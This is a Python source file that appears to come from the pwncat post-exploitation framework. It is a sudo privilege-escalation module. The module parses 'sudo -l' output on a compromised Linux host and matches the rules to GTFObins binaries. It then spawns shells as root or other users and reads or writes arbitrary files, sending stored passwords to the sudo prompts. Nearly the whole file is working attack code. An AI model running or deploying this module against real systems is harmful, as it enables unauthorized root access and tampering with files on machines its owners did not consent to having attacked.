#!/usr/bin/env python3
from typing import Generator, List
import shlex
import sys
from time import sleep
import os
from colorama import Fore, Style
import socket
from io import StringIO, BytesIO
import functools

from pwncat.util import CTRL_C
from pwncat.privesc.base import Method, PrivescError, Technique
from pwncat.file import RemoteBinaryPipe

from pwncat.pysudoers import Sudoers
from pwncat import gtfobins
from pwncat.privesc import Capability
from pwncat import util


class SudoMethod(Method):

    name = "sudo"
    BINARIES = ["sudo"]

    def __init__(self, pty: "pwncat.pty.PtyHandler"):
        super(SudoMethod, self).__init__(pty)

    def send_password(self, current_user):

        output = self.pty.client.recv(6, socket.MSG_PEEK).lower()

        if output == b"[sudo]" or output == b"passwo":
            if current_user["password"] is None:
                self.pty.client.send(CTRL_C)  # break out of password prompt
                raise PrivescError(
                    f"user {Fore.GREEN}{current_user['name']}{Fore.RESET} has no known password"
                )
        else:
            return  # it did not ask for a password, continue as usual

        # Reset the timeout to allow for sudo to pause
        old_timeout = self.pty.client.gettimeout()
        self.pty.client.settimeout(5)
        self.pty.client.send(current_user["password"].encode("utf-8") + b"\n")

        # Flush the rest of the password prompt
        self.pty.recvuntil("\n")

        # Check the output once more
        output = self.pty.client.recv(6, socket.MSG_PEEK).lower()

        # Reset the timeout to the originl value
        self.pty.client.settimeout(old_timeout)

        if (
            output == b"[sudo]"
            or output == b"passwo"
            or output == b"sorry,"
            or output == b"sudo: "
        ):
            self.pty.client.send(CTRL_C)  # break out of password prompt

            # Flush all the output
            self.pty.recvuntil(b"\n")
            raise PrivescError(
                f"user {Fore.GREEN}{current_user['name']}{Fore.RESET} could not sudo"
            )

        return

    def find_sudo(self):

        current_user = self.pty.current_user

        # Process the prompt but it will not wait for the end of the output
        # delim = self.pty.process("sudo -l", delim=True)
        delim = self.pty.process("sudo -p 'Password: ' -l", delim=True)

        self.send_password(current_user)

        # Get the sudo -l output
        output = self.pty.recvuntil(delim).split(delim)[0].strip()
        sudo_output_lines = output.split(b"\n")

        # Determine the starting line of the valuable sudo input
        sudo_output_index = -1
        for index, line in enumerate(sudo_output_lines):

            if line.lower().startswith(b"user "):
                sudo_output_index = index + 1
            if sudo_output_lines != -1:
                sudo_output_lines[index] = line.replace(b" : ", b":")

        sudo_values = "\n".join(
            [
                f"{current_user['name']} ALL={l.decode('utf-8').strip()}"
                for l in sudo_output_lines[sudo_output_index:]
            ]
        )

        sudoers = Sudoers(filp=StringIO(sudo_values))

        return sudoers.rules

    def enumerate(self, capability: int = Capability.ALL) -> List[Technique]:
        """ Find all techniques known at this time """

        sudo_rules = self.find_sudo()

        current_user = self.pty.current_user

        if not sudo_rules:
            return []

        sudo_no_password = []
        sudo_all_users = []
        sudo_other_commands = []

        for rule in sudo_rules:
            for commands in rule["commands"]:

                if commands["tags"] is None:
                    command_split = commands["command"].split()
                    run_as_user = command_split[0]
                    tag = ""
                    command = " ".join(command_split[1:])
                if type(commands["tags"]) is list:
                    tags_split = " ".join(commands["tags"]).split()
                    if len(tags_split) == 1:
                        command_split = commands["command"].split()
                        run_as_user = command_split[0]
                        tag = " ".join(tags_split)
                        command = " ".join(command_split[1:])
                    else:
                        run_as_user = tags_split[0]
                        tag = " ".join(tags_split[1:])
                        command = commands["command"]

                    # success(
                    #     f"user {Fore.GREEN}{current_user['name']}{Fore.RESET} can run "
                    #     + f"{Fore.YELLOW}{command}{Fore.RESET} "
                    #     + f"as user {Fore.BLUE}{run_as_user}{Fore.RESET} "
                    #     + f"with {Fore.BLUE}{tag}{Fore.RESET}",
                    #     overlay=True,
                    # )

                if "NOPASSWD" in tag:
                    sudo_no_password.append(
                        {
                            "run_as_user": run_as_user,
                            "command": command,
                            "password": False,
                        }
                    )

                if "ALL" in run_as_user:
                    sudo_all_users.append(
                        {"run_as_user": "root", "command": command, "password": True}
                    )

                else:
                    sudo_other_commands.append(
                        {
                            "run_as_user": run_as_user,
                            "command": command,
                            "password": True,
                        }
                    )

        current_user = self.pty.current_user

        techniques = []
        for sudo_privesc in [*sudo_no_password, *sudo_all_users, *sudo_other_commands]:
            if current_user["password"] is None and sudo_privesc["password"]:
                continue

            try:
                # Locate a GTFObins binary which satisfies the given sudo spec.
                # The PtyHandler.which method is used to verify the presence of
                # different GTFObins on the remote system when an "ALL" spec is
                # found.
                # sudo_privesc["command"], binary = gtfobins.Binary.find_sudo(
                #     sudo_privesc["command"], self.pty.which
                # )
                binaries = gtfobins.Binary.find_sudo(
                    sudo_privesc["command"], self.pty.which, capability
                )
            except gtfobins.SudoNotPossible:
                # No GTFObins possible with this sudo spec
                continue

            for binary in binaries:
                command = sudo_privesc["command"]
                if command == "ALL":
                    command = binary.path
                if sudo_privesc["run_as_user"] == "ALL":
                    # add a technique for root
                    techniques.append(
                        Technique(
                            "root",
                            self,
                            (binary, command, sudo_privesc["password"]),
                            binary.capabilities,
                        )
                    )
                else:
                    users = sudo_privesc["run_as_user"].split(",")
                    for u in users:
                        techniques.append(
                            Technique(
                                u,
                                self,
                                (binary, command, sudo_privesc["password"],),
                                binary.capabilities,
                            )
                        )

        return techniques

    def execute(self, technique: Technique):
        """ Run the specified technique """

        current_user = self.pty.current_user

        binary, sudo_spec, password_required = technique.ident

        before_shell_level = self.pty.run("echo $SHLVL").strip()
        before_shell_level = int(before_shell_level) if before_shell_level != b"" else 0

        shell_payload, input, exit = binary.sudo_shell(
            technique.user, sudo_spec, self.pty.shell
        )

        # Run the commands
        self.pty.run(shell_payload + "\n", wait=False)

        if password_required:
            self.pty.client.send(current_user["password"].encode("utf-8") + b"\n")

        # Provide stdin if needed
        self.pty.client.send(input.encode("utf-8"))

        # Give it a bit to let the shell start. We considered a sleep here, but
        # that was not consistent. This will utilizes the logic in `run` for
        # waiting for the output of the command (`echo`), which waits the
        # appropriate amount of time.
        self.pty.run("echo")

        user = self.pty.whoami()
        if user == technique.user:
            return exit

        after_shell_level = self.pty.run("echo $SHLVL").strip()
        after_shell_level = int(after_shell_level) if after_shell_level != b"" else 0

        if after_shell_level > before_shell_level:
            self.pty.run(exit, wait=False)  # here be dragons

        raise PrivescError("failed to privesc")

    def read_file(self, filepath: str, technique: Technique) -> RemoteBinaryPipe:

        info(
            f"attempting to read {Fore.BLUE}{filepath}{Fore.RESET} with {Fore.RED}{self.get_name(technique)}{Fore.RESET}"
        )
        binary, sudo_spec, password_required = technique.ident

        read_payload = binary.read_file(
            filepath, sudo_prefix=f"sudo -u {shlex.quote(technique.user)}"
        )

        read_pipe = self.pty.run(
            read_payload,
            input=functools.partial(self.send_password, self.pty.current_user),
        )

        return BytesIO(read_pipe)

    def write_file(self, filepath: str, data: bytes, technique: Technique):

        info(
            f"attempting to write {Fore.BLUE}{filepath}{Fore.RESET} with {Fore.RED}{self.get_name(technique)}{Fore.RESET}"
        )
        binary, sudo_spec, password_required = technique.ident
        payload = binary.write_file(
            filepath, data, sudo_prefix=f"sudo -u {shlex.quote(technique.user)}"
        )

        # Run the commands
        self.pty.run(
            payload, input=functools.partial(self.send_password, self.pty.current_user),
        )
